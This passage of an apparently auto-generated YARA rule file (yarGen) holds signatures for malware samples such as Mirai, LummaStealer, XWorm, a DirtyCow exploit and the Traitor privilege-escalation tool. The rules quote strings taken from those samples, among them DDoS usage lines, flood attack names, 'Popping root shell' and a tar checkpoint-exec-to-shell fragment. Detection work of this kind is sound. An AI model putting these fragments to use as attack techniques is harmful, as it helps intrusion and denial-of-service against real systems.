      $x1 = "C:\\Users\\sv\\Documents\\GitHub\\NOTOCAR\\NOTOCAR\\svchost\\svchost\\Release\\svchost.pdb" fullword ascii /* score: '34.00'*/
      $s2 = "service.exe" fullword ascii /* score: '25.00'*/
      $s3 = "audiodg.exe" fullword ascii /* score: '22.00'*/
      $s4 = "httpbypass" fullword ascii /* score: '22.00'*/
      $s5 = "windows.exe" fullword ascii /* score: '22.00'*/
      $s6 = "wrs.exe" fullword ascii /* score: '19.00'*/
      $s7 = "httppost" fullword ascii /* score: '16.00'*/
      $s8 = "httpflood" fullword ascii /* score: '16.00'*/
      $s9 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Unknown command or invalid parameters." fullword ascii /* score: '12.00'*/
      $s12 = "\\guid.dat" fullword ascii /* score: '12.00'*/
      $s13 = "Empty command" fullword ascii /* score: '12.00'*/
      $s14 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s15 = "GD+7tMl/cq0W9QLLxtvccCOlgLqhlFOamX183XajNoXMf0zfyqY5Hf9KsecuxZ7Bm1yELu3wR95sEAL2j5lmhzWWucUW4LrqtwLD+J3abFtKr58Sk6zjn0jMGq+GMdUw" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule sig_1ce0393afb262f97a2c3eb27365b1e4e_imphash__5a1a34df {
   meta:
      description = "dropzone - file 1ce0393afb262f97a2c3eb27365b1e4e(imphash)_5a1a34df.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5a1a34dfc44f9124a7b84f116a4e2573e46c89e67b9ec25e461829729eae2d63"
   strings:
      $x1 = "C:\\Users\\sv\\source\\repos\\svchost\\Release\\svchost.pdb" fullword ascii /* score: '38.00'*/
      $s2 = "service.exe" fullword ascii /* score: '25.00'*/
      $s3 = "audiodg.exe" fullword ascii /* score: '22.00'*/
      $s4 = "httpbypass" fullword ascii /* score: '22.00'*/
      $s5 = "windows.exe" fullword ascii /* score: '22.00'*/
      $s6 = "wrs.exe" fullword ascii /* score: '19.00'*/
      $s7 = "httppost" fullword ascii /* score: '16.00'*/
      $s8 = "httpflood" fullword ascii /* score: '16.00'*/
      $s9 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Unknown command or invalid parameters." fullword ascii /* score: '12.00'*/
      $s12 = "\\guid.dat" fullword ascii /* score: '12.00'*/
      $s13 = "Empty command" fullword ascii /* score: '12.00'*/
      $s14 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s15 = "GD+7tMl/cq0W9QLLxtvccCOlgLqhlFOamX183XajNoXMf0zfyqY5Hf9KsecuxZ7Bm1yELu3wR95sEAL2j5lmhzWWucUW4LrqtwLD+J3abFtKr58Sk6zjn0jMGq+GMdUw" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__3eaa16728a854711f996f462036af178_imphash_ {
   meta:
      description = "dropzone - file XWorm(signature)_3eaa16728a854711f996f462036af178(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "f58c71a74d72d71ebfef10ae4020dd1a0ce310ebc0c2ad44acb5f186d2e006ce"
   strings:
      $s1 = " inflate 1.2.3 Copyright 1995-2005 Mark Adler " fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00'*/
      $s2 = "+.):+=5=+b" fullword ascii /* score: '9.00'*/ /* hex encoded string '[' */
      $s3 = "-2#,5*+*:" fullword ascii /* score: '9.00'*/ /* hex encoded string '%' */
      $s4 = "3\"!2*32=" fullword ascii /* score: '9.00'*/ /* hex encoded string '22' */
      $s5 = "?:<++\"70" fullword ascii /* score: '9.00'*/ /* hex encoded string 'p' */
      $s6 = "+-7-5>36<" fullword ascii /* score: '9.00'*/ /* hex encoded string 'u6' */
      $s7 = "?26,/41!+*" fullword ascii /* score: '9.00'*/ /* hex encoded string '&A' */
      $s8 = "?:.69\"\"::" fullword ascii /* score: '9.00'*/ /* hex encoded string 'i' */
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      all of them
}

rule sig_9e20cfca573660f7fba9186046429eebc38b63856a808a7848a19566578af097_9e20cfca {
   meta:
      description = "dropzone - file 9e20cfca573660f7fba9186046429eebc38b63856a808a7848a19566578af097_9e20cfca.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9e20cfca573660f7fba9186046429eebc38b63856a808a7848a19566578af097"
   strings:
      $s1 = "xgethostbyname" fullword ascii /* score: '18.00'*/
      $s2 = "bb_default_login_shell" fullword ascii /* score: '17.00'*/
      $s3 = "get_kernel_revision" fullword ascii /* score: '14.00'*/
      $s4 = "xgetcwd" fullword ascii /* score: '13.00'*/
      $s5 = "bb_get_last_path_component" fullword ascii /* score: '12.00'*/
      $s6 = "bb_lookup_host" fullword ascii /* score: '12.00'*/
      $s7 = "bb_process_escape_sequence" fullword ascii /* score: '11.00'*/
      $s8 = "cmdedit_read_input" fullword ascii /* score: '10.00'*/
      $s9 = "bb_xgetlarg10_sfx" fullword ascii /* score: '9.00'*/
      $s10 = "hostname_main" fullword ascii /* score: '9.00'*/
      $s11 = "tftp_main" fullword ascii /* score: '9.00'*/
      $s12 = "usage_messages" fullword ascii /* score: '9.00'*/
      $s13 = "bb_xgetlarg" fullword ascii /* score: '9.00'*/
      $s14 = "getopt_mk_fifo_nod" fullword ascii /* score: '9.00'*/
      $s15 = "scantree" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule LummaStealer_signature__534d1f4899e357d483815235b1dd8f02_imphash_ {
   meta:
      description = "dropzone - file LummaStealer(signature)_534d1f4899e357d483815235b1dd8f02(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ecf7e8e17b502ca9e4b6274cf007bb8f9c18d0ad1518ce3911db3e70337958ab"
   strings:
      $s1 = "@5  0\"% " fullword ascii /* score: '9.00'*/ /* hex encoded string 'P' */
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__8d6a06a9946b41554b4eabd6890d8c46_imphash__74d762a3 {
   meta:
      description = "dropzone - file LummaStealer(signature)_8d6a06a9946b41554b4eabd6890d8c46(imphash)_74d762a3.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "74d762a3112f9e279d9e44fb54d3e50fe54d22efcfde448374bcb66593fee09c"
   strings:
      $s1 = ".Qcq:\\t)" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__8d6a06a9946b41554b4eabd6890d8c46_imphash__c9f48c75 {
   meta:
      description = "dropzone - file LummaStealer(signature)_8d6a06a9946b41554b4eabd6890d8c46(imphash)_c9f48c75.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c9f48c755baef832933c65ffb834979bfa06c6924122698205495b1c5213bbcc"
   strings:
      $s1 = ".Qcq:\\t)" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule sig_5615c604cac271f70009431e77241bc82158363cf6704c5375489a7a68f1f06c_5615c604 {
   meta:
      description = "dropzone - file 5615c604cac271f70009431e77241bc82158363cf6704c5375489a7a68f1f06c_5615c604.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5615c604cac271f70009431e77241bc82158363cf6704c5375489a7a68f1f06c"
   strings:
      $s1 = "Usage: %s <target_ip> <target_port> <threads> <packet_size> <duration> <method>" fullword ascii /* score: '28.00'*/
      $s2 = "Target: %s:%d" fullword ascii /* score: '19.50'*/
      $s3 = "_ZNSt12__basic_fileIcEC2EP15pthread_mutex_t" fullword ascii /* score: '18.00'*/
      $s4 = "_ZNSt12__basic_fileIcEC1EP15pthread_mutex_t" fullword ascii /* score: '18.00'*/
      $s5 = "pthread_mutex_lock@@GLIBC_2.2.5" fullword ascii /* score: '18.00'*/
      $s6 = "pthread_mutex_unlock@@GLIBC_2.2.5" fullword ascii /* score: '18.00'*/
      $s7 = "_Z26_txnal_logic_error_get_msgPv" fullword ascii /* score: '17.00'*/
      $s8 = "execute_native_thread_routine_compat" fullword ascii /* score: '17.00'*/
      $s9 = "Failed to connect to target" fullword ascii /* score: '17.00'*/
      $s10 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s11 = "_ZGVZN12_GLOBAL__N_122get_locale_cache_mutexEvE18locale_cache_mutex" fullword ascii /* score: '16.00'*/
      $s12 = "_ZN12_GLOBAL__N_116get_locale_mutexEv" fullword ascii /* score: '16.00'*/
      $s13 = "_ZSt7forwardINSt6thread8_InvokerISt5tupleIJPFPvS3_EP11thread_dataEEEEEOT_RNSt16remove_referenceISA_E4typeE" fullword ascii /* score: '16.00'*/
      $s14 = "_ZZN12_GLOBAL__N_116get_locale_mutexEvE12locale_mutex" fullword ascii /* score: '16.00'*/
      $s15 = "_ZGVZN12_GLOBAL__N_116get_locale_mutexEvE12locale_mutex" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 4000KB and
      8 of them
}

rule sig_17cc08458d3ac90b827e45b995263e0fba8533b7461afc90f9a6b1a1256f784c_17cc0845 {
   meta:
      description = "dropzone - file 17cc08458d3ac90b827e45b995263e0fba8533b7461afc90f9a6b1a1256f784c_17cc0845.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "17cc08458d3ac90b827e45b995263e0fba8533b7461afc90f9a6b1a1256f784c"
   strings:
      $s1 = "/tmp/log_de.log" fullword ascii /* score: '16.00'*/
      $s2 = "gethostbyname@@GLIBC_2.2.5" fullword ascii /* score: '14.00'*/
      $s3 = "fexecve@@GLIBC_2.2.5" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 30KB and
      all of them
}

rule Mirai_signature__c0f7e612 {
   meta:
      description = "dropzone - file Mirai(signature)_c0f7e612.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c0f7e6126444ba0b84b059b19f70479b8cb06a70a35d31eb8f8a82df7693e5b7"
   strings:
      $x1 = "Usage: %s <target> <port> <time> <threads> [proxy_file]" fullword ascii /* score: '31.00'*/
      $s2 = "_ZL12BYPASS_PORTS" fullword ascii /* score: '18.00'*/
      $s3 = "GET /?rand=%d HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s4 = "tcpbypass.c" fullword ascii /* score: '15.00'*/
      $s5 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s6 = "POST / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s7 = "_ZZ16setup_tcp_headerP6tcphdrE17flag_combinations" fullword ascii /* score: '12.00'*/
      $s8 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safar" ascii /* score: '12.00'*/
      $s9 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safar" ascii /* score: '12.00'*/
      $s10 = "_Z20get_socks_connectionPci" fullword ascii /* score: '12.00'*/
      $s11 = "Setting up Layer 4 TCP Bypass..." fullword ascii /* score: '10.00'*/
      $s12 = "_Z15setup_ip_headerP5iphdrPc" fullword ascii /* score: '9.00'*/
      $s13 = "_Z16setup_tcp_headerP6tcphdr" fullword ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" fullword ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule sig_4b7c2abc64e3600ba8ef583d85c0d9d604516e621ccbb8372f5723cc5442baec_4b7c2abc {
   meta:
      description = "dropzone - file 4b7c2abc64e3600ba8ef583d85c0d9d604516e621ccbb8372f5723cc5442baec_4b7c2abc.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4b7c2abc64e3600ba8ef583d85c0d9d604516e621ccbb8372f5723cc5442baec"
   strings:
      $s1 = "/tmp/log_de.log" fullword ascii /* score: '16.00'*/
      $s2 = "gethostbyname@@GLIBC_2.0" fullword ascii /* score: '14.00'*/
      $s3 = "fexecve@@GLIBC_2.0" fullword ascii /* score: '12.00'*/
      $s4 = "__i686.get_pc_thunk.bx" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 20KB and
      all of them
}

rule sig_1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591 {
   meta:
      description = "dropzone - file 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
   strings:
      $x1 = "stopTheWorld: not stopped (status != _Pgcstop)runtime: name offset base pointer out of rangeruntime: type offset base pointer ou" ascii /* score: '54.50'*/
      $x2 = "accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-encoded table f=accessing a corrupte" ascii /* score: '53.00'*/
      $x3 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bpruntime: double waitpreempt off reason: forcegc:" ascii /* score: '51.00'*/
      $x4 = "lock: lock countbad system huge page sizearena already initialized to unused region of spanunaligned sysNoHugePageOS/sched/gomax" ascii /* score: '48.00'*/
      $x5 = "unsafe.String: len out of rangezone must be a non-empty string.lib section in a.out corruptedcannot assign requested addressinva" ascii /* score: '45.50'*/
      $x6 = "abiRegArgsType needs GC Prog, update methodValueCallFrameObjsreflect: reflect.Value.Pointer on an invalid notinheap pointerfound" ascii /* score: '45.00'*/
      $x7 = ", locked to threadunable to parse IPinput/output errorno child processesfile name too longno locks availableidentifier removedmu" ascii /* score: '44.00'*/
      $x8 = "1776356839400250464677810668945312588817841970012523233890533447265625ryuFtoaFixed32 called with prec > 92006-01-02T15:04:05.999" ascii /* score: '43.00'*/
      $x9 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii /* score: '43.00'*/
      $x10 = "traceStopReadCPU called with trace enabledattempted to trace a bad status for a procexec: WaitDelay expired before I/O completem" ascii /* score: '41.00'*/
      $x11 = "sigaction failedinvalid argumentinvalid exchangeobject is remotemessage too longno route to hostremote I/O errorstopped (signal)" ascii /* score: '39.00'*/
      $x12 = "startTheWorld: inconsistent mp->nextpruntime: unexpected SPWRITE function all goroutines are asleep - deadlock!each group must h" ascii /* score: '39.00'*/
      $x13 = " (types from different scopes)failed to get system page sizeassignment to entry in nil mapruntime: found in object at *( in prep" ascii /* score: '39.00'*/
      $x14 = "release of handle with refcount 0142108547152020037174224853515625710542735760100185871124267578125reflect: slice index out of r" ascii /* score: '38.50'*/
      $x15 = "tried to trace goroutine with invalid or unsupported statusreflect: call of reflect.Value.Len on ptr to non-array Valuemanual sp" ascii /* score: '38.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 8000KB and
      1 of ($x*)
}

rule b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c {
   meta:
      description = "dropzone - file b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
   strings:
      $x1 = "non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=" ascii /* score: '55.00'*/
      $x2 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected '" ascii /* score: '44.00'*/
      $x3 = "Inscriptional_ParthianSIGSTKFLT: stack faultSIGTSTP: keyboard stopaddress already in useargument list too longassembly checks fa" ascii /* score: '35.00'*/
      $x4 = "syntax error scanning complex numberuncaching span but s.allocCount == 0) is smaller than minimum page size (2220446049250313080" ascii /* score: '35.00'*/
      $x5 = "MHeap_AllocLocked - MSpan not freeMSpan_EnsureSwept: m is not lockedOther_Default_Ignorable_Code_PointSIGURG: urgent condition o" ascii /* score: '34.00'*/
      $x6 = "unlock: lock countscanframe: bad symbol tablesignal received during forksigsend: inconsistent statestack size not a power of 2st" ascii /* score: '31.00'*/
      $x7 = "me.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mut" ascii /* score: '31.00'*/
      $x8 = "time.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.m" ascii /* score: '31.00'*/
      $s9 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s10 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s11 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s12 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
      $s13 = "garbage collection scangcDrain phase incorrectinterrupted system callinvalid m->lockedInt = left over markroot jobsmakechan: bad" ascii /* score: '30.00'*/
      $s14 = "os.(*ProcessState).os.sys" fullword ascii /* score: '30.00'*/
      $s15 = "SIGPIPE: write to broken pipeSIGPWR: power failure restartaddspecial on invalid pointerbufio.Scanner: token too longerror readin" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule c17e73d26cec96fd7a9c8aa10431818e14e3901f1e7c2d7aa0328e6536af2757_c17e73d2 {
   meta:
      description = "dropzone - file c17e73d26cec96fd7a9c8aa10431818e14e3901f1e7c2d7aa0328e6536af2757_c17e73d2.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c17e73d26cec96fd7a9c8aa10431818e14e3901f1e7c2d7aa0328e6536af2757"
   strings:
      $s1 = "Don't forget to restore /tmp/bak" fullword ascii /* score: '16.00'*/
      $s2 = "Popping root shell." fullword ascii /* score: '15.00'*/
      $s3 = "DirtyCow root privilege escalation" fullword ascii /* score: '14.00'*/
      $s4 = "cp %s /tmp/bak" fullword ascii /* score: '11.00'*/
      $s5 = "Backing up %s.. to /tmp/bak" fullword ascii /* score: '9.00'*/
      $s6 = "thread stopped" fullword ascii /* score: '9.00'*/
      $s7 = "exploit.c" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 50KB and
      all of them
}

rule Mirai_signature__1e3a4bbc {
   meta:
      description = "dropzone - file Mirai(signature)_1e3a4bbc.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e3a4bbc2b413eaaacfafa7813954c9868176f495d0f7493f782c02c00f71208"
   strings:
      $s1 = "attack_tcp_bypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s3 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s4 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s5 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s6 = "balphaset" fullword ascii /* score: '8.00'*/
      $s7 = "alphaset" fullword ascii /* score: '8.00'*/
      $s8 = "halphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__7d773198 {
   meta:
      description = "dropzone - file Mirai(signature)_7d773198.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7d77319833c5f581ed8e43c90f883fa04c57d0e4cc3a5df191dc6025f6f50c11"
   strings:
      $s1 = "attack_tcp_bypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s3 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s4 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s5 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s6 = "balphaset" fullword ascii /* score: '8.00'*/
      $s7 = "alphaset" fullword ascii /* score: '8.00'*/
      $s8 = "halphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Traitor_signature_ {
   meta:
      description = "dropzone - file Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $x1 = "adding nil Certificate to CertPoolarchive/tar: header field too longbad scalar length: %d, expected %dcan't evaluate field %s in" ascii /* score: '73.50'*/
      $x2 = "GODEBUG sys/cpu: can not enable \"GODEBUG: no value specified for \"SIGCHLD: child status has changedSIGTTIN: background read fr" ascii /* score: '67.50'*/
      $x3 = "/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pemcasgstatus: waiting for Gwaiting but is Grunnablechacha20poly1305: bad nonce le" ascii /* score: '67.00'*/
      $x4 = "Continuing to look for opportunitiesFinished attempting to set password.Go pointer stored into non-Go memoryIA5String contains i" ascii /* score: '61.50'*/
      $x5 = " to unused region of span/proc/sys/kernel/hostname2006-01-02T15:04:05Z07:002910383045673370361328125Authenticated as %s (%s)!BEG" ascii /* score: '61.50'*/
      $x6 = "IDS_Trinary_OperatorInsufficient StorageMAX_HEADER_LIST_SIZEMeroitic_HieroglyphsRequest URI Too LongSIGALRM: alarm clockSIGTERM:" ascii /* score: '57.50'*/
      $x7 = "--checkpoint-action=exec=/bin/sh/etc/pki/tls/certs/ca-bundle.crt28421709430404007434844970703125: day-of-year does not match day" ascii /* score: '57.50'*/
      $x8 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tto req" ascii /* score: '56.50'*/
      $x9 = "<blue>[</blue><yellow>+</yellow><blue>]</blue>asn1: Unmarshal recipient value is non-pointer attempting to link in too many shar" ascii /* score: '56.00'*/
      $x10 = "_cgo_notify_runtime_init_done missingall goroutines are asleep - deadlock!bytes.Buffer: truncation out of rangecannot create con" ascii /* score: '55.50'*/
      $x11 = "bytes.Buffer: reader returned negative count from Readcannot write to an offset aligned with a page boundarycertificate is not v" ascii /* score: '54.50'*/
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPWNFILE=%sParseFlo" ascii /* score: '53.50'*/
      $x13 = "http: RoundTripper implementation (%T) returned a nil *Response with a nil errortls: either ServerName or InsecureSkipVerify mus" ascii /* score: '53.50'*/
      $x14 = "34694469519536141888238489627838134765625<blue>[</blue><red>%s</red><blue>]</blue>GODEBUG sys/cpu: no value specified for \"MapI" ascii /* score: '52.50'*/
      $x15 = "tls: received unexpected handshake message of type %T when waiting for %TShell command to execute - leave blank to be dropped in" ascii /* score: '52.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 28000KB and
      1 of ($x*)
}

rule sig_8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8_8fe920b9 {
   meta:
      description = "dropzone - file 8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8_8fe920b9.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8"
   strings:
      $s1 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s2 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s3 = "sbrk() failure while processing tunables" fullword ascii /* score: '18.00'*/
      $s4 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s5 = "glibc.cpu.x86_non_temporal_threshold" fullword ascii /* score: '17.00'*/
      $s6 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s7 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s8 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s9 = "object_mutex" fullword ascii /* score: '15.00'*/
      $s10 = "*** %s ***: terminated" fullword ascii /* score: '15.00'*/
      $s11 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s12 = "_dl_process_pt_note" fullword ascii /* score: '15.00'*/
      $s13 = "(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned l" ascii /* score: '15.00'*/
      $s14 = "headmap.len == archive_stat.st_size" fullword ascii /* score: '15.00'*/
      $s15 = "execute_stack_op" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 3000KB and
      8 of them
}

rule sig_97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d21c2b1896a47d28_97495cae {
   meta:
      description = "dropzone - file 97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d21c2b1896a47d28_97495cae.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d21c2b1896a47d28"
   strings:
      $s1 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s2 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s3 = "sbrk() failure while processing tunables" fullword ascii /* score: '18.00'*/
      $s4 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s5 = "glibc.cpu.x86_non_temporal_threshold" fullword ascii /* score: '17.00'*/
      $s6 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s7 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s8 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s9 = "object_mutex" fullword ascii /* score: '15.00'*/
      $s10 = "*** %s ***: terminated" fullword ascii /* score: '15.00'*/
      $s11 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s12 = "_dl_process_pt_note" fullword ascii /* score: '15.00'*/
      $s13 = "(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned l" ascii /* score: '15.00'*/
      $s14 = "headmap.len == archive_stat.st_size" fullword ascii /* score: '15.00'*/
      $s15 = "execute_stack_op" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 3000KB and
      8 of them
}

rule Mirai_signature__25b1987f {
   meta:
      description = "dropzone - file Mirai(signature)_25b1987f.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25b1987fafd5af1b605dd75c498a2bff3301d36625995b46c6f7087f6de850d4"
   strings:
      $s1 = "tar() { if [ \"${1#-}\" = \"$1\" ]; then command tar; else command tar \"$@\"; fi; }" fullword ascii /* score: '12.00'*/
      $s2 = "/usr/include/lastlog.h" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__52073113 {
   meta:
      description = "dropzone - file Mirai(signature)_52073113.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "520731133e7e2333e9164e0a556c0df6ebff182392518abb94c4e4810db3723d"
   strings:
      $s1 = "tar() { if [ \"${1#-}\" = \"$1\" ]; then command tar; else command tar \"$@\"; fi; }" fullword ascii /* score: '12.00'*/
